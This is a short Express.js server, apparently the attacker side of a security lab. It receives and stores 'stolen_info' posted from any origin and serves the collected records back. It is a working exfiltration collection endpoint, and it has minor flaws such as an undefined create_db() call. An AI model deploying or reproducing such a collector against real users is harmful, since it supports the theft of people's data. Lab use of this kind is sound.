const express = require('express');
const app = express();
const port = 4000
var connection = require('./database')
const cors = require('cors');

app.use(cors({
    origin: '*'
}));
app.use(express.json());

app.get('/', (req, res) => {
    let sql = 'SELECT info FROM STOLEN_INFO'
    connection.query(sql, (err, result) => {
        if (err) {
            throw err
        }
        else {
            console.log(JSON.parse(JSON.stringify(result)))
            res.send(JSON.parse(JSON.stringify(result)))
        }
    })
  })
  
app.post('/stolenInfo', (req, res) => {
    console.log(req.body)
    const info = req.body.stolen_info;

    if (!info) {
        return res.status(400).send('Bad Request: Missing "info" in the request body');
    }

    let sql = 'INSERT INTO stolen_info (info) VALUES (?)';
    connection.query(sql, info, (err, result) => {
        if (err) {
            throw err;
        } else {
            res.send('Data added successfully');
        }
    });
});

app.delete('/resetDB', (req, res) => {

    let sql = 'DELETE FROM adversary_db.posts WHERE id;'
    connection.query(sql, (err, result) => {
        if (err) {
            throw err
        }
        else {
            res.send(JSON.parse(JSON.stringify(result)))
        }
    })  
});

function reset_db() {
    let sql = 'DELETE FROM adversary_db.posts WHERE id;'
    connection.query(sql, (err, result) => {
        if (err) {
            throw err
        }
        else {
            console.log(JSON.parse(JSON.stringify(result)))
        }
    })  
}
create_db()

  app.listen(port, () => {
    console.log(`Example app listening on port ${port}`)
    connection.connect((err) => {
        if (err) {
            throw err
        }
        else {
            console.log('Database connected')
        }
    })
  })